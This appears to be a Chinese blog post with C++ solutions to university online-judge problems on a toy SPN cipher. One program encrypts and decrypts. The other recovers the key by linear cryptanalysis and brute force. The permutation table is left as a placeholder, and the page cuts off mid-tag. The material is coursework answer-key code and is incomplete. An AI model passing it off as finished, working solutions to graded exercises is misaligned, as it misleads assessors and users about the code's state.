<p>注意打表文件太大，就不贴出来了，自行打表。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> SBox[<span class="number">16</span>] = &#123; <span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> PBox[<span class="number">16</span>] = &#123; <span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> SBox_inverse[<span class="number">16</span>] = &#123; <span class="number">14</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> PBox_inverse[<span class="number">16</span>] = &#123; <span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> c=(a&gt;&gt;(<span class="number">4</span>*(<span class="number">4</span>-i)))&amp;<span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">if</span>(c&gt;=<span class="number">0</span>&amp;&amp;c&lt;=<span class="number">9</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>+c);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c&gt;=<span class="number">10</span>&amp;&amp;c&lt;=<span class="number">15</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>+c<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    ch = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (ch != <span class="string">&#x27; &#x27;</span> &amp;&amp; ch != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x *= <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            x += ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            x += ch - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">DecToHex</span><span class="params">(<span class="keyword">int</span> dec)</span>        <span class="comment">//十进制转十六进制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> hex[<span class="number">16</span>] = &#123; <span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> point = dec / <span class="number">0x1000</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x1000</span>;</span><br><span class="line">    point = dec / <span class="number">0x100</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x100</span>;</span><br><span class="line">    point = dec / <span class="number">0x10</span>;</span><br><span class="line">    str = str + hex[point];</span><br><span class="line">    dec -= point * <span class="number">0x10</span>;</span><br><span class="line">    str = str + hex[dec];</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S_Change</span><span class="params">(<span class="keyword">int</span> dec)</span>					<span class="comment">//S盒置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0xf000</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x0f00</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x00f0</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    back |= (SBox[tool] &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x000f</span>;</span><br><span class="line">    back |= SBox[tool];</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">P_Change</span><span class="params">(<span class="keyword">int</span> dec)</span>						<span class="comment">//P盒置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(PBox[i] &gt;= i+<span class="number">1</span>)</span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox[i]))) &lt;&lt; (PBox[i] - i - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox[i]))) &gt;&gt; (<span class="number">1</span> - PBox[i] + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S_Change_inverse</span><span class="params">(<span class="keyword">int</span> dec)</span>				<span class="comment">//S盒逆置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0xf000</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x0f00</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x00f0</span>;</span><br><span class="line">    tool &gt;&gt;= <span class="number">4</span>;</span><br><span class="line">    back |= (SBox_inverse[tool] &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    tool = dec;</span><br><span class="line">    tool &amp;= <span class="number">0x000f</span>;</span><br><span class="line">    back |= SBox_inverse[tool];</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">P_Change_inverse</span><span class="params">(<span class="keyword">int</span> dec)</span>						<span class="comment">//P盒逆置换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> back = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (PBox[i] &gt;= i + <span class="number">1</span>)</span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox_inverse[i]))) &lt;&lt; (PBox_inverse[i] - i - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            back += (dec &amp; (<span class="number">1</span> &lt;&lt; (<span class="number">16</span> - PBox_inverse[i]))) &gt;&gt; (<span class="number">1</span> - PBox_inverse[i] + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> back;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w[<span class="number">4</span>], K[<span class="number">5</span>], u[<span class="number">4</span>], v[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">int</span> Key;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> pppp[<span class="number">65536</span>] =&#123;打表&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        Key = <span class="built_in">read</span>();</span><br><span class="line">        w[<span class="number">0</span>] = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">        K[<span class="number">0</span>] = Key &gt;&gt; <span class="number">16</span>;                        <span class="comment">//生成密钥</span></span><br><span class="line">        K[<span class="number">1</span>] = (Key &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">2</span>] = (Key &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">3</span>] = (Key &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        K[<span class="number">4</span>] = Key &amp; <span class="number">0xffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)                <span class="comment">//加密</span></span><br><span class="line">        &#123;</span><br><span class="line">            u[j] = w[j] ^ K[j];</span><br><span class="line">            v[j] = <span class="built_in">S_Change</span>(u[j]);</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">3</span>)</span><br><span class="line">                w[j + <span class="number">1</span>] = pppp[v[j]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> x = v[<span class="number">3</span>] ^K[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        v[<span class="number">3</span>] = K[<span class="number">4</span>] ^ (x ^ <span class="number">1</span>);                    <span class="comment">//解密</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            u[j] = <span class="built_in">S_Change_inverse</span>(v[j]);</span><br><span class="line">            w[j] = u[j] ^ K[j];</span><br><span class="line">            <span class="keyword">if</span> (j &gt; <span class="number">0</span>)</span><br><span class="line">                v[j - <span class="number">1</span>] = pppp[w[j]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(x);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="built_in">print</span>(w[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="线性分析"><a class="markdownIt-Anchor" href="#线性分析"></a> 线性分析</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/II">oj | 线性分析</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030102409.png" alt="线性分析" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> us unsigned int</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getc()                                                                 \</span></span><br><span class="line">  (_b1 == _b2      ? <span class="built_in">fread</span>(_b, <span class="number">1</span>, <span class="number">100000</span>, stdin), _b2 = _b + <span class="number">100000</span>,           \</span><br><span class="line">   *((_b1 = _b)++) : *(_b1++))</span><br><span class="line"><span class="keyword">char</span> _b[<span class="number">100000</span>], *_b1, *_b2;</span><br><span class="line"><span class="comment">// s代换器</span></span><br><span class="line">us substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>&#125;,</span><br><span class="line">    &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125;&#125;;</span><br><span class="line">us permutation[<span class="number">65536</span>] = &#123;打表&#125;;</span><br><span class="line"><span class="function">us <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> ciphertext)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//s盒的代换</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    plaintext ^= ((k &gt;&gt; (<span class="number">16</span> - <span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">    plaintext = substitution[<span class="number">0</span>][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    plaintext = permutation[plaintext];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//p盒的置换</span></span><br><span class="line">  plaintext ^= ((k &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">  plaintext = substitution[<span class="number">0</span>][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((substitution[<span class="number">0</span>][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">  plaintext ^= (k &amp; <span class="number">0xffff</span>);</span><br><span class="line">  <span class="keyword">return</span> (plaintext == ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> us <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  us h = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> c = <span class="built_in">getc</span>();</span><br><span class="line">  <span class="keyword">while</span> (c != <span class="string">&#x27; &#x27;</span> &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">    h = h * <span class="number">16</span> + ((c &gt;= <span class="string">&#x27;a&#x27;</span>) ? (c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>) : (c - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">    c = <span class="built_in">getc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n, times, maxNum[<span class="number">2</span>];</span><br><span class="line">  pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; count1[<span class="number">256</span>], count2[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> plaintext[<span class="number">8000</span>], ciphertext[<span class="number">8000</span>], temp[<span class="number">4</span>], k[<span class="number">8</span>], lastKey2, key;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="built_in">getc</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    lastKey2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">fill</span>(count1, count1 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">-4000</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">      plaintext[j] = <span class="built_in">read</span>();</span><br><span class="line">      ciphertext[j] = <span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算第一条链，求出k[5]和k[7]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (k[<span class="number">5</span>] = <span class="number">0</span>; k[<span class="number">5</span>] &lt; <span class="number">16</span>; k[<span class="number">5</span>]++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (k[<span class="number">7</span>] = <span class="number">0</span>; k[<span class="number">7</span>] &lt; <span class="number">16</span>; k[<span class="number">7</span>]++) &#123;</span><br><span class="line">          temp[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">          temp[<span class="number">3</span>] = ((ciphertext[j] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">          temp[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp[<span class="number">1</span>]];</span><br><span class="line">          temp[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp[<span class="number">3</span>]];</span><br><span class="line">          <span class="keyword">if</span> ((((plaintext[j] &amp; <span class="number">0x800</span>) &gt;&gt; <span class="number">11</span>) ^ ((plaintext[j] &amp; <span class="number">0x200</span>) &gt;&gt; <span class="number">9</span>) ^</span><br><span class="line">               ((plaintext[j] &amp; <span class="number">0x100</span>) &gt;&gt; <span class="number">8</span>) ^ (temp[<span class="number">1</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">               ((temp[<span class="number">1</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">3</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">               ((temp[<span class="number">3</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>)) == <span class="number">0</span>)</span><br><span class="line">            count1[k[<span class="number">5</span>] * <span class="number">16</span> + k[<span class="number">7</span>]].first++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 得到部分密钥</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">      count1[j].second = j;</span><br><span class="line">      count1[j].first = <span class="built_in">abs</span>(count1[j].first);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(count1, count1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      lastKey2 = k[<span class="number">5</span>];</span><br><span class="line">      k[<span class="number">5</span>] = count1[j].second / <span class="number">16</span>;</span><br><span class="line">      k[<span class="number">7</span>] = count1[j].second % <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 计算第二条链</span></span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">255</span> || lastKey2 != k[<span class="number">5</span>]) &#123;</span><br><span class="line">        <span class="built_in">fill</span>(count2, count2 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">-4000</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8000</span>; j++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (k[<span class="number">4</span>] = <span class="number">0</span>; k[<span class="number">4</span>] &lt; <span class="number">16</span>; k[<span class="number">4</span>]++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k[<span class="number">6</span>] = <span class="number">0</span>; k[<span class="number">6</span>] &lt; <span class="number">16</span>; k[<span class="number">6</span>]++) &#123;</span><br><span class="line">              temp[<span class="number">0</span>] = ((ciphertext[j] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">              temp[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">              temp[<span class="number">2</span>] = ((ciphertext[j] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">              temp[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp[<span class="number">0</span>]];</span><br><span class="line">              temp[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp[<span class="number">1</span>]];</span><br><span class="line">              temp[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp[<span class="number">2</span>]];</span><br><span class="line">              <span class="keyword">if</span> ((((plaintext[j] &amp; <span class="number">0x800</span>) &gt;&gt; <span class="number">11</span>) ^</span><br><span class="line">                   ((plaintext[j] &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>) ^ ((temp[<span class="number">0</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^</span><br><span class="line">                   (temp[<span class="number">0</span>] &amp; <span class="number">0x1</span>) ^ ((temp[<span class="number">1</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">1</span>] &amp; <span class="number">0x1</span>) ^</span><br><span class="line">                   ((temp[<span class="number">2</span>] &amp; <span class="number">0x4</span>) &gt;&gt; <span class="number">2</span>) ^ (temp[<span class="number">2</span>] &amp; <span class="number">0x1</span>)) == <span class="number">0</span>)</span><br><span class="line">                count2[k[<span class="number">4</span>] * <span class="number">16</span> + k[<span class="number">6</span>]].first++;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">          count2[j].second = j;</span><br><span class="line">          count2[j].first = <span class="built_in">abs</span>(count2[j].first);</span><br><span class="line">        &#125;</span><br><span class="line">        maxNum[<span class="number">0</span>] = <span class="built_in">max_element</span>(count2, count2 + <span class="number">256</span>) - count2;</span><br><span class="line">        count2[maxNum[<span class="number">0</span>]].first = <span class="number">0</span>;</span><br><span class="line">        maxNum[<span class="number">1</span>] = (*<span class="built_in">max_element</span>(count2, count2 + <span class="number">256</span>)).second;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h &lt; <span class="number">1</span>; h++) &#123;</span><br><span class="line">        k[<span class="number">4</span>] = maxNum[h] / <span class="number">16</span>;</span><br><span class="line">        k[<span class="number">6</span>] = maxNum[h] % <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">for</span> (k[<span class="number">0</span>] = <span class="number">0</span>; k[<span class="number">0</span>] &lt; <span class="number">65535</span>; k[<span class="number">0</span>]++) &#123;</span><br><span class="line">          key = (k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) | (k[<span class="number">4</span>] &lt;&lt; <span class="number">12</span>) | (k[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (k[<span class="number">6</span>] &lt;&lt; <span class="number">4</span>) | k[<span class="number">7</span>];</span><br><span class="line">          <span class="keyword">for</span> (times = <span class="number">0</span>; times &lt; <span class="number">2</span>; times++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">SPN</span>(key, plaintext[times], ciphertext[times]))</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (times == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (times == <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (times == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 